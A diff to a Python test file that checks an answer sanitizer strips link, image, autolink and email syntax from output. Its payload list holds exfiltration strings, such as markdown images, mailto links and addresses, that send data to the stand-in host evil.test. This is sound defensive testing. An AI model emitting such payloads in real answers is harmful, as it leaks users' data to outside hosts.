@@ -1,3 +1,5 @@
+import re
+
 import pytest
 
 from utils.answer_sanitizer import AnswerSanitizer, sanitize
@@ -7,6 +9,8 @@ PAYLOADS = [
     "Up 2% ![c][r]\n\n[r]: //evil.test/?d=AAPL_6000\n",
     "Up 2% ![[a]](//evil.test/?d=1) [Reuters news](https://r.com) www.evil.test/a",
     "![c](https://evil.test/c?d=" + "9" * 600 + ")",
+    "Source: <http:evil.test/?d=AAPL_60000> and <mailto:x@evil.test?body=63313>",
+    "Mail AAPL6000@evil.test for details",
 ]
 
 
@@ -24,6 +28,8 @@ def test_no_link_or_image_syntax_survives_streaming(payload, size):
     assert "[" not in out and "]" not in out
     assert "://" not in out
     assert "www." not in out.lower()
+    assert re.search(r"<[A-Za-z]", out) is None
+    assert re.search(r"\w@\w", out) is None
 
 
 def test_plain_text_comparisons_and_cjk_pass_through():
